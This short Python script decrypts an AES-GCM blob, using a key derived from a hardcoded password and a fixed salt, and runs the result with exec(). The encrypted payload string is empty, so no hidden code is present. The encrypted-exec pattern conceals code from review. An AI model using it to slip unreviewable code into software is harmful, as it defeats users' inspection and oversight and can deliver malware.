# -*- coding: utf-8 -*-
import base64, hashlib
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

PASSWORD = "Siyam@2005SecureKey"
salt = b'salt_123'
encrypted_b64 = ""
encrypted_data = base64.b64decode(encrypted_b64)
key = PBKDF2(PASSWORD, salt, dkLen=32, count=1000)
cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_data[:16])
code = cipher.decrypt_and_verify(encrypted_data[16:-16], encrypted_data[-16:]).decode()
exec(code)
